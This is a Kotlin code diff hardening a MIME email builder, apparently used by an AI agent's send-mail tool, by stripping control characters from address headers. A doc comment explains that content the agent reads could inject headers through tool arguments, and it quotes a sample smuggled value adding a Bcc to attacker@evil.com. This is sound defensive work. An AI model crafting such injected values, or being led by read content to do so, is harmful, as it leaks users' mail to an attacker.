@@ -21,10 +21,10 @@ object MimeMessageBuilder {
     ): String {
         require(to.isNotEmpty()) { "At least one recipient required" }
         val headers = buildList {
-            add("From: ${from.trim()}")
-            add("To: ${to.joinToString(", ") { it.trim() }}")
-            if (cc.isNotEmpty()) add("Cc: ${cc.joinToString(", ") { it.trim() }}")
-            if (bcc.isNotEmpty()) add("Bcc: ${bcc.joinToString(", ") { it.trim() }}")
+            add("From: ${address(from)}")
+            add("To: ${addresses(to)}")
+            if (cc.isNotEmpty()) add("Cc: ${addresses(cc)}")
+            if (bcc.isNotEmpty()) add("Bcc: ${addresses(bcc)}")
             add("Subject: ${encodeHeader(subject)}")
             add("MIME-Version: 1.0")
             add("Content-Type: text/plain; charset=\"UTF-8\"")
@@ -39,7 +39,24 @@ object MimeMessageBuilder {
         java.util.Base64.getUrlEncoder().withoutPadding()
             .encodeToString(rawMessage.toByteArray(Charsets.UTF_8))
 
-    /** RFC 2047 encoded-word for non-ASCII header values; plain values pass through. */
+    private fun addresses(values: List<String>): String =
+        values.joinToString(", ") { address(it) }
+
+    /**
+     * A single address header value. Addresses reach here from model-generated
+     * tool arguments, which in turn derive from content the agent read (emails,
+     * web pages), so a CR/LF inside one would let that content inject its own
+     * headers — `"a@b.com\r\nBcc: attacker@evil.com"` becoming a real Bcc.
+     * No legitimate address contains a control character, so strip them all.
+     */
+    private fun address(value: String): String =
+        value.filterNot { it.code < 32 || it.code == 127 }.trim()
+
+    /**
+     * RFC 2047 encoded-word for non-ASCII header values; plain values pass
+     * through. Control characters fail the printable-ASCII test and so take the
+     * base64 branch, which neutralises any CR/LF a subject might carry.
+     */
     private fun encodeHeader(value: String): String {
         if (value.all { it.code in 32..126 }) return value
         val encoded = java.util.Base64.getEncoder()
